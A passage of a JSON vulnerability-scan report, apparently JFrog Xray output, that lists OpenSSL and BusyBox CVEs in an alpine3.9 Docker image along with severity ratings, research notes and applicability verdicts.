\"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-607991\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-607991&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2023-0216\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>When checking ELF files, the scanner checks if at least one of the vulnerable functions is called:</p>\\n<ul>\\n<li><code>d2i_PKCS7()</code></li>\\n<li><code>d2i_PKCS7_bio()</code></li>\\n<li><code>d2i_PKCS7_fp()</code></li>\\n</ul>\\n<p>When checking Python files, the scanner checks if at least one of the vulnerable functions is called with external input to its 1st (<code>bytes</code>) argument:</p>\\n<ul>\\n<li><code>cryptography.hazmat.primitives.serialization.pkcs7.load_der_pkcs7_certificates</code></li>\\n<li><code>cryptography.hazmat.primitives.serialization.pkcs7.load_pem_pkcs7_certificates</code></li>\\n</ul>\",\n                    \"evidence\": null,\n                    \"info\": \"The vulnerable OpenSSL functions are never called\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2023-0216\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>When checking ELF files, the scanner checks if at least one of the vulnerable functions is called:</p>\\n<ul>\\n<li><code>d2i_PKCS7()</code></li>\\n<li><code>d2i_PKCS7_bio()</code></li>\\n<li><code>d2i_PKCS7_fp()</code></li>\\n</ul>\\n<p>When checking Python files, the scanner checks if at least one of the vulnerable functions is called with external input to its 1st (<code>bytes</code>) argument:</p>\\n<ul>\\n<li><code>cryptography.hazmat.primitives.serialization.pkcs7.load_der_pkcs7_certificates</code></li>\\n<li><code>cryptography.hazmat.primitives.serialization.pkcs7.load_pem_pkcs7_certificates</code></li>\\n</ul>\",\n                    \"evidence\": null,\n                    \"info\": \"The vulnerable OpenSSL functions are never called\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2023-0216\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2023-0216\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"Calls to EVP_CipherUpdate, EVP_EncryptUpdate and EVP_DecryptUpdate may overflow the output length argument in some cases where the input length is close to the maximum permissable length for an integer on the platform. In such cases the return value from the function call will be 1 (indicating success), but the output length value will be negative. This could cause applications to behave incorrectly or crash. OpenSSL versions 1.1.1i and below are affected by this issue. Users of these versions should upgrade to OpenSSL 1.1.1j. OpenSSL versions 1.0.2x and below are affected by this issue. However OpenSSL 1.0.2 is out of support and no longer receiving public updates. Premium support customers of OpenSSL 1.0.2 should upgrade to 1.0.2y. Other users should upgrade to 1.1.1j. Fixed in OpenSSL 1.1.1j (Affected 1.1.1-1.1.1i). Fixed in OpenSSL 1.0.2y (Affected 1.0.2-1.0.2x).\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-140633\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-140633&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"An integer overflow in OpenSSL leads to unspecified impact when encrypting/decrypting very large user input.\",\n                \"full_description\": \"For some cryptographic encryption/decryption schemes, OpenSSL determines the operation's output length by rounding-up (or aligning) the input length value.\\n\\nIn cases where the input length is completely user controlled, an attacker can set the input length to INT_MAX (2GB for 32-bit binaries) which will cause the output length to be a small negative number.\\n\\nThe impact from this issue depends on what the calling program does with the output length, but will most likely lead to denial of service in the worst case (ex. if the output length is later handled as an unsigned integer).\\n\\nNote that in cases where the input length is completely user controlled, it is very likely that the program will crash even before getting to the OpenSSL encryption/decryption operation.\",\n                \"jfrog_research_severity\": \"Medium\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The CVE has no published technical writeup\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue has no exploit published\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact\",\n                        \"description\": \"Rated as 'Low' severity in original advisory\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.\",\n                        \"description\": \"Denial of service\",\n                        \"is_positive\": true\n                    }\n                ]\n            },\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"\",\n                    \"vulnerability_id\": \"CVE-2021-23840\",\n                    \"result\": \"not_covered\"\n                }\n            ]\n        },\n        {\n            \"description\": \"BusyBox through 1.35.0 allows remote attackers to execute arbitrary code if netstat is used to print a DNS PTR record's value to a VT compatible terminal. Alternatively, the attacker could choose to change the terminal's colors.\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:busybox:1.29.3-r10\",\n                \"alpine://3.9:ssl_client:1.29.3-r10\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-203005\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-203005&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"Escape sequence injection in BusyBox's netstat results in unspecified impact (code execution if using some extreme-legacy terminal emulators).\",\n                \"full_description\": \"`netstat` is a command line utility that displays active TCP connections, recent UDP transmissions, and listening sockets.\\n\\nIn [BusyBox](https://busybox.net/)'s `netstat` implementation, a vulnerability exists in which DNS PTR record values are not sanitized for escape characters before printing. This issue affects Virtual Terminal emulators, in which special escape characters may be used to command the terminal, and may even result in code execution, although there is no available exploit demonstrating this. The lack of RCE PoC code is due to the fact that no modern terminal emulator allows code execution via escape characters.\\n\\nTo exploit this vulnerability, an attacker must be able to carry out a DNS poisoning attack, so that a query from a vulnerable machine is answered with a malicious response (i.e. when trying to connect to a certain host), containing Virtual Terminal escape characters. Additionally, `netstat` must be executed at the same time from a VT emulator, so that the DNS response containing the malicious hostname is printed and interpreted by the VT as an escaped command.\",\n                \"jfrog_research_severity\": \"Low\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The issue can be exploited by attackers over the network\",\n                        \"description\": \"The vulnerability is triggered over DNS\",\n                        \"is_positive\": false\n                    },\n                    {\n                        \"name\": \"The issue has an exploit published\",\n                        \"description\": \"Publish exploit demonstrates an attack with a payload that changes terminal colors\",\n                        \"is_positive\": false\n                    },\n                    {\n                        \"name\": \"The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact\",\n                        \"description\": \"The Attack Complexity for this vulnerability is \\\"Low\\\", but should be \\\"High\\\". Moreover, \\\"Confidentiality\\\" is \\\"High\\\", but exploitation impact is context-dependent and cannot be presumed\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"description\": \"Exploitation depends on the target system using (i.e. automatically calling, or by user interaction) `netstat` from a VT emulator after trying to connect to a spoofed host. No modern terminal emulator allows code execution via escape characters.\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue cannot result in a severe impact (such as remote code execution)\",\n                        \"description\": \"No modern terminal emulator allows code execution via escape characters\",\n                        \"is_positive\": true\n                    }\n                ]\n            },\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2022-28391\",\n                    \"scan_status\": 1,\n                    \"applicability\": null,\n                    \"evidence\": null,\n                    \"info\": \"Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user must run the \\\"netstat\\\" CLI tool at exactly the same time that a DNS poisoning attack is made.\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2022-28391\",\n                    \"scan_status\": 1,\n                    \"applicability\": null,\n                    \"evidence\": null,\n                    \"info\": \"Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user must run the \\\"netstat\\\" CLI tool at exactly the same time that a DNS poisoning attack is made.\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2022-28391\",\n                    \"result\": \"undetermined\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2022-28391\",\n                    \"result\": \"undetermined\"\n                }\n            ]\n        },\n        {\n            \"description\": \"The openssl (aka node-openssl) NPM package through 2.0.0 was characterized as \\\"a nonsense wrapper with no real purpose\\\" by its author, and accepts an opts argument that contains a verb field (used for command execution). NOTE: This vulnerability only affects products that are no longer supported by the maintainer.\",\n            \"severity\": \"Critical\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-539878\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-539878&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2023-49210\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks whether the vulnerable <code>openssl</code> function is used with external input.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"The vulnerable function openssl is never called with external input\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2023-49210\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks whether the vulnerable <code>openssl</code> function is used with external input.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"The vulnerable function openssl is never called with external input\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2023-49210\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2023-49210\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the handle_special function\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:busybox:1.29.3-r10\",\n                \"alpine://3.9:ssl_client:1.29.3-r10\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-190226\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-190226&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.\",\n                \"full_description\": \"The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\\n\\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `handle_special` function.\\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.\",\n                \"jfrog_research_severity\": \"Medium\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"description\": \"The applet must accept arbitrary command line arguments from an external source\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector\",\n                        \"description\": \"The attacker would need to determine which external input propagates into the applet's command line arguments\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue cannot result in a severe impact (such as remote code execution)\",\n                        \"description\": \"Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.\",\n                        \"is_positive\": true\n                    }\n                ],\n                \"remediation\": \"##### Development mitigations\\n\\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile\"\n            },\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42384\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42384\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42384\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42384\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"A NULL pointer can be dereferenced when signatures are being\\nverified on PKCS7 signed or signedAndEnveloped data. In case the hash\\nalgorithm used for the signature is known to the OpenSSL library but\\nthe implementation of the hash algorithm is not available the digest\\ninitialization will fail. There is a missing check for the return\\nvalue from the initialization function which later leads to invalid\\nusage of the digest API most likely leading to a crash.\\n\\nThe unavailability of an algorithm can be caused by using FIPS\\nenabled configuration of providers or more commonly by not loading\\nthe legacy provider.\\n\\nPKCS7 data is processed by the SMIME library calls and also by the\\ntime stamp (TS) library calls. The TLS implementation in OpenSSL does\\nnot call these functions however third party applications would be\\naffected if they call these functions to verify signatures on untrusted\\ndata.\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-607993\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-607993&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2023-0401\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>When checking ELF files, the scanner checks whether at least one of the vulnerable API calls is called:</p>\\n<ul>\\n<li><code>PKCS7_decrypt</code></li>\\n<li><code>PKCS7_dataInit</code></li>\\n</ul>\\n<p>Note that the CVE is never applicable in Python, since the vulnerable functions cannot be externally invoked</p>\",\n                    \"evidence\": null,\n                    \"info\": \"No references to the vulnerable function were found\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2023-0401\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>When checking ELF files, the scanner checks whether at least one of the vulnerable API calls is called:</p>\\n<ul>\\n<li><code>PKCS7_decrypt</code></li>\\n<li><code>PKCS7_dataInit</code></li>\\n</ul>\\n<p>Note that the CVE is never applicable in Python, since the vulnerable functions cannot be externally invoked</p>\",\n                    \"evidence\": null,\n                    \"info\": \"No references to the vulnerable function were found\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2023-0401\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2023-0401\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"ASN.1 strings are represented internally within OpenSSL as an ASN1_STRING structure which contains a buffer holding the string data and a field holding the buffer length. This contrasts with normal C strings which are repesented as a buffer for the string data which is terminated with a NUL (0) byte. Although not a strict requirement, ASN.1 strings that are parsed using OpenSSL's own \\\"d2i\\\" functions (and other similar parsing functions) as well as any string whose value has been set with the ASN1_STRING_set() function will additionally NUL terminate the byte array in the ASN1_STRING structure. However, it is possible for applications to directly construct valid ASN1_STRING structures which do not NUL terminate the byte array by directly setting the \\\"data\\\" and \\\"length\\\" fields in the ASN1_STRING array. This can also happen by using the ASN1_STRING_set0() function. Numerous OpenSSL functions that print ASN.1 data have been found to assume that the ASN1_STRING byte array will be NUL terminated, even though this is not guaranteed for strings that have been directly constructed. Where an application requests an ASN.1 structure to be printed, and where that ASN.1 structure contains ASN1_STRINGs that have been directly constructed by the application without NUL terminating the \\\"data\\\" field, then a read buffer overrun can occur. The same thing can also occur during name constraints processing of certificates (for example if a certificate has been directly constructed by the application instead of loading it via the OpenSSL parsing functions, and the certificate contains non NUL terminated ASN1_STRING structures). It can also occur in the X509_get1_email(), X509_REQ_get1_email() and X509_get1_ocsp() functions. If a malicious actor can cause an application to directly construct an ASN1_STRING and then process it through one of the affected OpenSSL functions then this issue could be hit. This might result in a crash (causing a Denial of Service attack). It could also result in the disclosure of private memory content...\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-183483\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-183483&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2021-3712\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks whether the <code>ASN1_STRING</code> structure is created by searching for the existence of all the functions that create the <code>ASN1_STRING</code> structure or other structures that are based on the <code>ASN1_STRING</code> structure:</p>\\n<ul>\\n<li>ASN1_STRING_new()<br />\\nASN1_STRING_type_new()<br />\\nASN1_OCTET_STRING_new()<br />\\nASN1_BIT_STRING_new()<br />\\nASN1_INTEGER_new()<br />\\nASN1_ENUMERATED_new()<br />\\nASN1_UTF8STRING_new()<br />\\nASN1_IA5STRING_new()<br />\\nASN1_UNIVERSALSTRING_new()<br />\\nASN1_BMPSTRING_new()<br />\\nASN1_GENERALSTRING_new()<br />\\nASN1_T61STRING_new()<br />\\nASN1_VISIBLESTRING_new()<br />\\nASN1_PRINTABLESTRING_new()<br />\\nASN1_PRINTABLE_new()<br />\\nDIRECTORYSTRING_new()<br />\\nDISPLAYTEXT_new()  <br />\\nASN1_GENERALIZEDTIME_new()<br />\\nASN1_UTCTIME_new()<br />\\nASN1_TIME_new()</li>\\n</ul>\",\n                    \"evidence\": null,\n                    \"info\": \"No references to the vulnerable function were found\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2021-3712\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks whether the <code>ASN1_STRING</code> structure is created by searching for the existence of all the functions that create the <code>ASN1_STRING</code> structure or other structures that are based on the <code>ASN1_STRING</code> structure:</p>\\n<ul>\\n<li>ASN1_STRING_new()<br />\\nASN1_STRING_type_new()<br />\\nASN1_OCTET_STRING_new()<br />\\nASN1_BIT_STRING_new()<br />\\nASN1_INTEGER_new()<br />\\nASN1_ENUMERATED_new()<br />\\nASN1_UTF8STRING_new()<br />\\nASN1_IA5STRING_new()<br />\\nASN1_UNIVERSALSTRING_new()<br />\\nASN1_BMPSTRING_new()<br />\\nASN1_GENERALSTRING_new()<br />\\nASN1_T61STRING_new()<br />\\nASN1_VISIBLESTRING_new()<br />\\nASN1_PRINTABLESTRING_new()<br />\\nASN1_PRINTABLE_new()<br />\\nDIRECTORYSTRING_new()<br />\\nDISPLAYTEXT_new()  <br />\\nASN1_GENERALIZEDTIME_new()<br />\\nASN1_UTCTIME_new()<br />\\nASN1_TIME_new()</li>\\n</ul>\",\n                    \"evidence\": null,\n                    \"info\": \"No references to the vulnerable function were found\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2021-3712\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2021-3712\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the clrvar function\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:ssl_client:1.29.3-r10\",\n                \"alpine://3.9:busybox:1.29.3-r10\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-190230\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-190230&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.\",\n                \"full_description\": \"The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\\n\\nA use-after-free in `awk` leads to denial of service and possibly code execution when processing a crafted awk pattern in the `clrvar` function.\\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.\",\n                \"jfrog_research_severity\": \"Medium\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"description\": \"The applet must accept arbitrary command line arguments from an external source\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector\",\n                        \"description\": \"The attacker would need to determine which external input propagates into the applet's command line arguments\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue cannot result in a severe impact (such as remote code execution)\",\n                        \"description\": \"Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.\",\n                        \"is_positive\": true\n                    }\n                ],\n                \"remediation\": \"##### 